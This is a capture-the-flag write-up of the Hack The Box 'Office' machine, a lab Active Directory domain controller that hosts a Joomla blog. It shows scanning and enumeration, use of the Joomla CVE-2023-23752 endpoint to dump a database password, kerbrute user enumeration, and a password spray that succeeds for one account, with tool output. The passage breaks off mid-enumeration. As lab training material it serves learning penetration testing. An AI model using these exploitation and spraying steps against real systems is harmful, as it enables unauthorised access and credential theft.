---
layout: default_1
title: "Office - HTB"
date: 2024-04-20
tags: writeup hackthebox office active directory domain controller
---

# HTB Office Write Up
![HTB Office](/assets/2024-06-22-writeups-office-htb/machine_info.png "HTB Office")


## Introduction
A Active Directory Domain Controller server, with a web server for the Company's blog.

## Network Scan

<details>
<summary><b>Nmap scan result</b></summary>
<div markdown="1">

~~~
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-robots.txt: 16 disallowed entries
| /joomla/administrator/ /administrator/ /api/ /bin/
| /cache/ /cli/ /components/ /includes/ /installation/
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-22 19:59:49Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-22T20:01:21+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
| SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
| SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
|_ssl-date: 2024-06-22T20:01:21+00:00; +8h00m01s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-22T20:01:21+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
| SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-06-22T20:01:21+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA/domainComponent=office
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
| SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
| -----BEGIN CERTIFICATE-----
| MIIFyzCCBLOgAwIBAgITQAAAAAMdA83RpYN55AAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGb2ZmaWNl
| MRUwEwYDVQQDEwxvZmZpY2UtREMtQ0EwHhcNMjMwNTEwMTIzNjU4WhcNMjQwNTA5
| MTIzNjU4WjAYMRYwFAYDVQQDEw1EQy5vZmZpY2UuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEA15Wa3dfyWK0+9iRvZ2H4VWeXwLq40Ee6jzcu8buW
| D/Hp4rubrQa5X2/iS3NdXMsxamygq4s7R5AJa9Ys3I7sm59ctlCo/vjVag0hbqhU
| 5qjBJ1GCQxdiaqRj3BqAO5Tbt9RUH9oeU/UQMzzUQqwKL/Z+twyh9aL6HDnbPXvM
| IeDewk5y/S6M8DlOc6ORZQfBg8NuroyiPYCNb1+WhednfBB0ahNFqzq2MTDLXMNM
| bLeX2zeO/+dgF1ohsQ9qhFyBtFSsaCMR33PMKNs7Iqji42+O5jVNCvUICelUroex
| 1VrC7ogW/JVSqHY4J+6mXZHJhn7xhu6rJKtFDHLeheheRQIDAQABo4IC4DCCAtww
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzA5BgNVHREEMjAwoB8GCSsGAQQBgjcZ
| AaASBBA2idyIqAZET5Xm5iLN7Fc3gg1EQy5vZmZpY2UuaHRiMB0GA1UdDgQWBBRS
| FLVfJhlc3XkBccZHJjyKvpRS1TAfBgNVHSMEGDAWgBRgOpmCFktRJECTymSHaes3
| Vx3p9jCBxAYDVR0fBIG8MIG5MIG2oIGzoIGwhoGtbGRhcDovLy9DTj1vZmZpY2Ut
| REMtQ0EsQ049REMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENO
| PVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9b2ZmaWNlLERDPWh0Yj9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaBnWxk
| YXA6Ly8vQ049b2ZmaWNlLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBT
| ZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPW9mZmljZSxE
| Qz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRp
| b25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBABw9WEKbYyfAE7PZ0Plb7lxB
| Ftvjpqh2Q9RkdSlxQNdWMfSsZozN6UNTG7mgJBB/T9vZpi8USJTGwf1EfygiDbm1
| yofBMvpqLAXg4ANvWXTDChYSumhlt7W+gJzTgWd4mgRp576acFojnNCqQRhYCD8r
| 6r/PIwlCDSwfLExxhQs7ZL3Jkqt/fP85ic3W9GuzwI9isPZmwsezP/korptA7utb
| sJHn2bydwf907VX2usW8yRmpuRZyvfsbYHYjJqFgohB5dh26ltEQz2vX6y4Mte4L
| 024aNx/gANh3F4gFXpGrAWdVxnHXc1QV9OVRHO+FAL30xdhosJ4D4HdRTDjCfqw=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
57567/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
  
~~~
</div>

</details>


## Investigation
To start the investigation we can perform some DNS queries and check if it is possible to perform a Zone Transfer
```
$ dig axfr office.htb 10.10.11.3

; <<>> DiG 9.18.26 <<>> axfr office.htb @10.10.11.3
;; global options: +cmd
; Transfer failed.

$ dig any office.htb @10.10.11.3

< ... SNIP ... >

;; ANSWER SECTION:
office.htb.             600     IN      A       10.250.0.30
office.htb.             600     IN      A       10.10.11.3
office.htb.             3600    IN      NS      dc.office.htb.
office.htb.             3600    IN      SOA     dc.office.htb. hostmaster.office.htb. 63 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.office.htb.          1200    IN      A       10.10.11.3

< ... SNIP ... >
```
Although the DNS queries didn't returned any subdomain, we can still bruteforce it with `ffuf`.  
But first, let's check the web server.  
![main website](/assets/2024-06-22-writeups-office-htb/main_website.png "main website")

Looks like a CMS server, checking the html source code for any information:  
```
<meta name="generator" content="Joomla! - Open Source Content Management">
```

It is a Joomla CMS, accessing the [hacktricks joomla enumeration page][ht-joomla].  
The version is 4.2.7, this means it's vulnerable to [CVE-2023-23752][CVE-2023-23752].  
This vulnerability has a straigh forward exploitation, just access `http://<host>/api/index.php/v1/config/application?public=true`.
Using a [public exploit][CVE-2023-23752-exploit] just to pretty print.  
```
$ python3 juid.py -a http://10.10.11.3/

[USERS]
Name: Tony Stark
ID: 474
Username: Administrator
Email: Administrator@holography.htb
Register date: 2023-04-13 23:27:32
Group name: Super Users
Able to send e-mail: Yes

[CONFIGS]
Database type: mysqli
Host: localhost
User: root
Password: H0lOgrams4reTakIng0Ver754!
Database: joomla_db
Database prefix: if2tx_
Encryption: 0
```

It is not possible to login into the Joomla Administration Panel with the dumped password.  
For now, the blog enumeration reached a dead end.

Let's look into the Active Directory environment.
Using [enum4linux-ng][enum4linux-ng] to a fast enumeration.
```
$ python3 enum4linux-ng 10.10.11.3

OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: OFFICE
DNS domain: office.htb
FQDN: DC.office.htb
Derived membership: domain member
Derived domain: OFFICE
```

It's not possible to access anymore services with a null user.  
Now, we need to enumerate some users on the Active Directory and check for weak passwords and password reuse.  
RID Brute is not and option, so using [kerbrute][kerbrute] will be necessary.  
Enumerating users using this method normally takes a long time, so when I see that's a Active Directory running, this is one of the first things that I do.
```
$ ./kerbrute_linux_amd64 -v --dc 10.10.11.3 -d office.htb userenum xato-lowercase.txt

< ... SNIP ... >
administrator@office.htb
dlanor@office.htb
dmichael@office.htb
dwolfe@office.htb
etower@office.htb
ewhite@office.htb
hhogan@office.htb

< ... SNIP ... >
```

Then, testing for password reuse first:
```
$ ./kerbrute_linux_amd64 -v --dc 10.10.11.3 -d office.htb passwordspray ~/office/users.txt 'H0lOgrams4reTakIng0Ver754!'

< ... SNIP ... >
dlanor@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
etower@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
ewhite@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
administrator@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
dmichael@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
dwolfe@office.htb:H0lOgrams4reTakIng0Ver754! - [Root cause: KDC_Error] KDC_Error: AS Exchange Error: kerberos error response from KDC: KRB Error: (37) KRB_AP_ERR_SKEW Clock skew     too great
hhogan@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password

< ... SNIP ... >
```

The `KRB_AP_ERR_SKEW Clock skew` error is pretty common, it happens when the client and server time are different.  
One way I like to solve this problem is using the server NTP service, getting the time with python and setting to the system.
The python3 script is the following:
```python3
import ntplib
from time import ctime
c = ntplib.NTPClient()
response = c.request('office.htb')
print(ctime(response.tx_time))
```

Save it to ntp.py and then setting the system time:
```
$ sudo date -s "$(python3 ntp.py)"
```

Performing the password spray again:  
```
$ ./kerbrute_linux_amd64 -v --dc 10.10.11.3 -d office.htb passwordspray ~/office/users.txt 'H0lOgrams4reTakIng0Ver754!'

< ... SNIP ... >
hhogan@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
dlanor@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
ewhite@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
dmichael@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
administrator@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
etower@office.htb:H0lOgrams4reTakIng0Ver754! - Invalid password
VALID LOGIN:  dwolfe@office.htb:H0lOgrams4reTakIng0Ver754!

< ... SNIP ... >
```

Now, with a AD User in hands, we need to perform the same Active Directory enumeration we've before.  
This is crucial in AD environments and in many others, it's always a cyclic process.  
Running [enum4linux-ng][enum4linux-ng] again, this time with dwolfe user:

<details>
<summary><b>Users</b></summary>
<div markdown="1">

~~~
'1107':
  username: PPotts
  name: (null)
  acb: '0x00000210'
  description: (null)
'1108':
  username: HHogan
  name: (null)
  acb: '0x00000210'
  description: (null)
'1109':
  username: EWhite
  name: (null)
  acb: '0x00000210'
  description: (null)
'1110':
  username: etower
  name: (null)
  acb: '0x00000210'
  description: (null)
'1111':
  username: dwolfe
  name: (null)
  acb: '0x00000210'
  description: (null)
'1112':
  username: dmichael
  name: (null)
  acb: '0x00000210'
  description: (null)
'1113':
  username: dlanor
  name: (null)
  acb: '0x00000210'
  description: (null)
'1114':
  username: tstark
  name: (null)
  acb: '0x00000210'
  description: (null)
'1118':
  username: web_account
  name: (null)
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00004210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account
~~~
</div>

</details>


<details>
<summary><b>Password Policy</b></summary>
<div markdown="1">
  
~~~
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Maximum password age: 41 days 23 hours 53 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 1 minute
  Lockout duration: 1 minute
  Lockout threshold: 20
Domain logoff information:
  Force logoff time: not set
~~~
</div>

</details>

<details>
